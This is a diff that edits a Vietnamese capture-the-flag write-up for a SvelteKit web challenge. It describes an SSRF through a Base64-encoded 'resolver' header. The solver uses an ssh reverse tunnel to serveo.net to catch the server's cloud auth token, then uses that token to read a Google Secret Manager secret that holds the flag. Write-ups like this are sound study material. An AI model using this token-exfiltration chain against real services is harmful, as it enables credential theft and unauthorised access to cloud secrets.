@@ -1,16 +1,16 @@
 # Cloudy with a Chance of Spaceships - Web (67 pts)
 
 **Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}`
-**Tài nguyên:** Không có tập tin đính kèm. Toàn bộ dữ liệu được trích xuất trực tiếp từ máy chủ dịch vụ đang vận hành (thông qua tệp `files/index.html` kích thước 1827 B và tệp mã nguồn `files/2.CftUi-UM.js` kích thước 5694 B, SHA256 `2cc74b92...b97e173`).
+**Tài nguyên:** Không có file đính kèm. Toàn bộ dữ liệu được trích xuất trực tiếp từ máy chủ dịch vụ đang vận hành (thông qua file `files/index.html` kích thước 1827 B và file mã nguồn `files/2.CftUi-UM.js` kích thước 5694 B, SHA256 `2cc74b92...b97e173`).
 
 ## Đề bài
 
-Hệ thống cung cấp một ứng dụng web xây dựng bằng SvelteKit tại địa chỉ `http://34.116.80.78:9143/`. Giao diện hiển thị danh sách năm tàu vũ trụ và cung cấp chức năng "đo nhiệt độ thân tàu" thông qua các nút bấm tương ứng. Gợi ý đính kèm của đề bài là: "What's your forecast looking like?". Mục tiêu cuối cùng là thu thập cờ (flag) có định dạng chuẩn `CSSCTF{...}`.
+Đề cung cấp một ứng dụng web xây dựng bằng SvelteKit tại địa chỉ `http://34.116.80.78:9143/`. Giao diện hiển thị danh sách năm tàu vũ trụ và cung cấp chức năng "đo nhiệt độ thân tàu" thông qua các nút bấm tương ứng. Gợi ý đính kèm của đề bài là: "What's your forecast looking like?". Mục tiêu là lấy flag (flag) có định dạng chuẩn `CSSCTF{...}`.
 Đặc điểm kỹ thuật: Giao diện hoàn toàn không có trường nhập liệu (input form). Mọi tương tác của người dùng đều kích hoạt một lệnh gọi mạng tới địa chỉ `/api/v1/ship/<tên>/temperature`, sau đó ứng dụng sẽ hiển thị một giá trị số.
 
 ## Phân tích ban đầu
 
-Kiểm tra phản hồi từ đường dẫn gốc (`GET /`), hệ thống trả về thông số `x-sveltekit-page: true` và phần header `link:` liệt kê toàn bộ các gói (bundle) đính kèm. Dữ liệu trạng thái kết xuất phía máy chủ (server-rendered data) là `null`, đồng thời tuyến API (route) không được cấu hình hiển thị trực tiếp trong mã HTML. Do đó, quy trình phân tích yêu cầu phải trích xuất tệp Javascript `_app/immutable/nodes/2.CftUi-UM.js`. Quá trình kiểm tra tệp này phát hiện các đoạn mã trọng tâm sau:
+Kiểm tra phản hồi từ đường dẫn gốc (`GET /`), hệ thống trả về thông số `x-sveltekit-page: true` và phần header `link:` liệt kê toàn bộ các gói (bundle) đính kèm. Dữ liệu trạng thái xuất phía máy chủ (server-rendered data) là `null`, đồng thời tuyến API (route) không được cấu hình hiển thị trực tiếp trong mã HTML. Do đó, quy trình phân tích yêu cầu phải trích xuất file Javascript `_app/immutable/nodes/2.CftUi-UM.js`. Quá trình kiểm tra file này phát hiện các đoạn mã trọng tâm sau:
 
 ```javascript
 async function T(a,t,e){
@@ -24,7 +24,7 @@ const e="XeyJyZXNvbHZlciI6Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NwYWNlX3dlYX
 
 Biến `e` là một hằng số được khởi tạo sẵn trong gói. Phần chuỗi theo sau ký tự `X` ban đầu chính là đoạn mã hóa Base64 của chuỗi JSON `{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}`. Theo đó, Header mạng được xây dựng dựa trên định dạng `"X" + base64(json)`, và chuỗi JSON này chỉ chứa một khóa duy nhất là `resolver`.
 
-Tiến hành kiểm thử cấu trúc Header trực tiếp đối với máy chủ (dữ liệu được lưu trong `analysis/resolver_probe.log`):
+kiểm thử cấu trúc Header trực tiếp đối với máy chủ (dữ liệu được lưu trong `analysis/resolver_probe.log`):
 
 ```text
 Trường hợp thiếu header                       : Trả về HTTP 451, body= (rỗng)
@@ -62,7 +62,7 @@ python analysis/catch_auth.py 8911
 ssh -R 80:localhost:8911 serveo.net
 ```
 
-Dịch vụ Serveo phản hồi một địa chỉ công khai, ví dụ: `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`. Đoạn mã `catch_auth.py` có nhiệm vụ lưu lại các luồng JSON request vào tệp `analysis/auth.log` và phản hồi nội dung ngẫu nhiên (`CLOUDY-<epoch>`) nhằm đảm bảo kết quả số thay đổi qua từng phiên, chứng minh máy chủ đã thực sự đọc nội dung phản hồi. Kịch bản `exploit.py` thực hiện gọi tới `/api/v1/ship/Cassini/temperature` với `resolver` trỏ về địa chỉ callback vừa thiết lập:
+Dịch vụ Serveo phản hồi một địa chỉ công khai, ví dụ: `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`. Đoạn mã `catch_auth.py` có nhiệm vụ lưu lại các luồng JSON request vào file `analysis/auth.log` và phản hồi nội dung ngẫu nhiên (`CLOUDY-<epoch>`) nhằm đảm bảo kết quả số thay đổi qua từng phiên, chứng minh máy chủ đã thực sự đọc nội dung phản hồi. Kịch bản `exploit.py` thực hiện gọi tới `/api/v1/ship/Cassini/temperature` với `resolver` trỏ về địa chỉ callback vừa thiết lập:
 
 ```text
 [+] Khai thác SSRF thành công, HTTP 200, giá trị temperature='2.4'
@@ -107,12 +107,11 @@ Với quyền hạn (scope) ở mức `cloud-platform`, quá trình truy xuất 
 [+] Kiểm tra secretmanager: HTTP 200, totalSize=1, danh sách secrets=['goog_encryption_secret']
 [+] Truy xuất goog_encryption_secret@1 (45 ký tự) = CSSCTF{your_forecast_says_love_is_on_its_way}
 ```
-
-**Kiểm chứng:** Token được thu thập và sử dụng hoàn toàn dưới dạng thô qua cấu trúc đường hầm (tunnel), không có dữ liệu chèn cứng trong mã kịch bản. Kịch bản `exploit.py` chỉ báo hiệu thành công (exit 0) khi payload giải mã chứa tiền tố `CSSCTF{`, đồng thời xuất kết quả vào tệp `flag.txt`. Chuỗi kết quả gồm 45 ký tự hiển thị được, đáp ứng định dạng cờ chuẩn, và nội dung chuỗi có liên quan trực tiếp tới câu hỏi định hướng của thử thách. Tiến hành tái lập lại quy trình 3 lần riêng biệt bằng 3 mã token khác nhau đều đưa ra kết quả đồng nhất.
+**Kiểm chứng:** `exploit.py` nhận token từ request tới tunnel, kiểm tra tiền tố `CSSCTF{`, lưu kết quả vào `flag.txt` và trả exit code 0 khi đạt điều kiện đó. Ba lần chạy với ba token khác nhau trả cùng flag 45 ký tự.
 
 ## Flag
 
-Quá trình thực thi mã kịch bản:
+Chạy script:
 
 ```bash
 python exploit.py https://<hash>-<ip>.serveousercontent.com
